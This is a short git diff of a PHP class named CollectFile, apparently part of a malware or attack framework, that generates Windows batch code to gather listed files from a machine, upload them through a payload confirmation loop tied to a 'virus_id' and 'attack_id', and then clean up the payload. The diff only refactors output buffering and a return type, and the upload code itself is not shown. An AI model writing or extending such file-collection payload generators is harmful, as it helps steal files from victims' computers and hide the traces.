@@ -22,8 +22,6 @@ class CollectFile extends AttackBase {
         return $this->fileNames;
     }
 
-    /** @noinspection PhpUnusedParameterInspection */
-
     public function setFileNames(string $fileNames): void {
         $this->fileNames = filter(map(explode("\n", $fileNames), function ($element) {
             return trim($element);
@@ -53,8 +51,8 @@ class CollectFile extends AttackBase {
         }, null, false);
     }
 
-    public function generateBatchCode(): string {
-        ob_start(); //@formatter:off ?>
+    public function generateBatchCode(): void {
+        //@formatter:off ?>
         chCp 65001
         <?php
         for ($i = 0; $i < count($this->fileNames); $i++) { ?>
@@ -67,7 +65,7 @@ class CollectFile extends AttackBase {
         }
         echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
         echo BaseScriptWin::cleanUpPayload();
-        return ob_get_clean(); //@formatter:on
+        //@formatter:on
     }
 
     private function generateUploadCode(): string {
